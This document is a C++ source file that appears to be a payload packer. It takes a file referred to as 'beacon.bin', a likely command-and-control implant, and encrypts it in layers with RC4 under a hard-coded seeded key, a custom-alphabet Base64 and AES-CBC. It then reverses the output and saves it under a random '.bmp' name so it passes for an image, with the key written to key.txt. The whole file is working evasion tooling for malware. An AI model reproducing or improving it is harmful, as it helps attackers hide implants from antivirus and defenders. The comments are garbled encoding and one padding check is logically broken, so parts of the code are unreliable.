#define _CRT_SECURE_NO_DEPRECATE

#include <iostream>
#include "AES.h"
#include "Base64.h"
#include <vector>
#include <fstream>
#include <random>

using namespace std;

const char* g_key = "";
const char* g_iv = "gfdertfghjkuyrtg";//ECB MODE����Ҫ����chain���������
string rc4Key;

string EncryptionAES(const string& strSrc) //AES����
{
	size_t length = strSrc.length();
	int block_num = length / BLOCK_SIZE + 1;
	//����
	char* szDataIn = new char[block_num * BLOCK_SIZE + 1];
	memset(szDataIn, 0x00, block_num * BLOCK_SIZE + 1);
	strcpy(szDataIn, strSrc.c_str());

	//����PKCS7Padding��䡣
	int k = length % BLOCK_SIZE;
	int j = length / BLOCK_SIZE;
	int padding = BLOCK_SIZE - k;
	for (int i = 0; i < padding; i++)
	{
		szDataIn[j * BLOCK_SIZE + k + i] = padding;
	}
	szDataIn[block_num * BLOCK_SIZE] = '\0';

	//���ܺ������
	char* szDataOut = new char[block_num * BLOCK_SIZE + 1];
	memset(szDataOut, 0, block_num * BLOCK_SIZE + 1);

	//���н���AES��CBCģʽ����
	AES aes;
	aes.MakeKey(g_key, g_iv, 16, 16);
	aes.Encrypt(szDataIn, szDataOut, block_num * BLOCK_SIZE, AES::CBC);
	string str = base64_encode((unsigned char*)szDataOut,
		block_num * BLOCK_SIZE);
	delete[] szDataIn;
	delete[] szDataOut;
	return str;
}

string DecryptionAES(const string& strSrc) //AES����
{
	string strData = base64_decode(strSrc);
	size_t length = strData.length();
	//����
	char* szDataIn = new char[length + 1];
	memcpy(szDataIn, strData.c_str(), length + 1);
	//����
	char* szDataOut = new char[length + 1];
	memcpy(szDataOut, strData.c_str(), length + 1);

	//����AES��CBCģʽ����
	AES aes;
	aes.MakeKey(g_key, g_iv, 16, 16);
	aes.Decrypt(szDataIn, szDataOut, length, AES::CBC);

	//ȥPKCS7Padding���
	if (0x00 < szDataOut[length - 1] <= 0x16)
	{
		int tmp = szDataOut[length - 1];
		for (int i = length - 1; i >= length - tmp; i--)
		{
			if (szDataOut[i] != tmp)
			{
				memset(szDataOut, 0, length);
				cout << "ȥ���ʧ�ܣ����ܳ�����" << endl;
				break;
			}
			else
				szDataOut[i] = 0;
		}
	}
	string strDest(szDataOut);
	delete[] szDataIn;
	delete[] szDataOut;
	return strDest;
}

// �Զ����RC4�����㷨ʵ��
std::string rc4Decrypt(const std::string& input, const std::string& key) {
	std::vector<unsigned char> S(256);
	for (int i = 0; i < 256; ++i) {
		S[i] = i;
	}

	int j = 0;
	for (int i = 0; i < 256; ++i) {
		j = (j + S[i] + key[i % key.length()]) % 256;
		std::swap(S[i], S[j]);
	}

	int i = 0;
	j = 0;
	std::string output = input;
	for (int k = 0; k < input.length(); ++k) {
		i = (i + 1) % 256;
		j = (j + S[i]) % 256;
		std::swap(S[i], S[j]);
		output[k] ^= S[(S[i] + S[j]) % 256];
	}

	return output;
}

std::string rc4Encrypt(const std::string& input, const std::string& key) {
	std::vector<unsigned char> S(256);
	for (int i = 0; i < 256; ++i) {
		S[i] = i;
	}

	int j = 0;
	for (int i = 0; i < 256; ++i) {
		j = (j + S[i] + key[i % key.length()]) % 256;
		std::swap(S[i], S[j]);
	}

	int i = 0;
	j = 0;
	std::string output = input;
	for (int k = 0; k < input.length(); ++k) {
		i = (i + 1) % 256;
		j = (j + S[i]) % 256;
		std::swap(S[i], S[j]);
		output[k] ^= S[(S[i] + S[j]) % 256];
	}

	return output;
}


// �Զ����Base64����ʵ��
std::string base64Decode(const std::string& input) {
	const std::string base64Chars = "i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN";

	std::string output;
	int val = 0;
	int valBits = 0;

	for (const auto& c : input) {
		if (c == '=') {
			break; // ��������ַ�
		}

		val = (val << 6) | base64Chars.find(c);
		valBits += 6;

		if (valBits >= 8) {
			valBits -= 8;
			output += static_cast<char>((val >> valBits) & 0xFF);
		}
	}
	return output;
}

// �Զ����Base64����ʵ��
std::string base64Encode(const std::string& input) {
	const std::string base64Chars = "i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN";

	std::string output;
	int val = 0;
	int valBits = 0;

	for (const auto& c : input) {
		val = (val << 8) | static_cast<unsigned char>(c);
		valBits += 8;

		while (valBits >= 6) {
			valBits -= 6;
			output += base64Chars[(val >> valBits) & 0x3F];
		}
	}

	if (valBits > 0) {
		val <<= (6 - valBits);
		output += base64Chars[val & 0x3F];

		int padding = (6 - valBits) / 2;
		for (int i = 0; i < padding; ++i) {
			output += '=';
		}
	}

	return output;
}

std::string generateFixedString(int num) {
	std::string fixedString = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";

	std::mt19937 generator(num); // ������ͬ������ֵ
	std::shuffle(fixedString.begin(), fixedString.end(), generator);

	return fixedString.substr(0, 16); // ȡǰ16λ��Ϊ�̶��ַ���
}

std::string generateRandomString(int length) 
{
	std::string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	std::string randomString;

	std::srand(std::time(nullptr));  // ��ʼ�������������

	for (int i = 0; i < length; i++) {
		int randomIndex = std::rand() % charset.length();  // �����������
		randomString += charset[randomIndex];  // ������ַ���ӵ��ַ�����
	}

	return randomString;
}

int main(int argc,char* argv[])
{
	//Bw4T9mvouk^rlR@A
	string rc4Key = generateFixedString(12468);
	// ��ȡbeacon.bin�ļ�
	ifstream inputFile(argv[1], ios::binary);
	if (!inputFile)
	{
		cout << "Failed to open file: beacon.bin" << endl;
		return 0;
	}

	g_key = argv[2];

	// ��ȡ�ļ�����
	inputFile.seekg(0, ios::end);
	size_t fileSize = inputFile.tellg();
	inputFile.seekg(0, ios::beg);

	// ��ȡ�ļ�����
	vector<char> buffer(fileSize);
	inputFile.read(buffer.data(), fileSize);
	inputFile.close();

	string plaintext(buffer.begin(), buffer.end());

	// RC4����
	string rc4Ciphertext = rc4Encrypt(plaintext, rc4Key);

	// Base64����
	string base64Ciphertext = base64Encode(rc4Ciphertext);

	// AES����
	string aesCiphertext = EncryptionAES(base64Ciphertext);
	std::reverse(aesCiphertext.begin(), aesCiphertext.end());

	// �����ܽ������������ļ���
	int length = 10;
	std::string randomString = generateRandomString(length) + ".bmp";
	ofstream outputFile(randomString);
	if (!outputFile)
	{
		cout << "Failed to create file" << endl;
		return 0;
	}
	outputFile << aesCiphertext;
	outputFile.close();

	ofstream keyFile("key.txt");
	if (!keyFile)
	{
		cout << "Failed to create file: key.txt" << endl;
		return 0;
	}
	keyFile << g_key;

	
	return 0;
}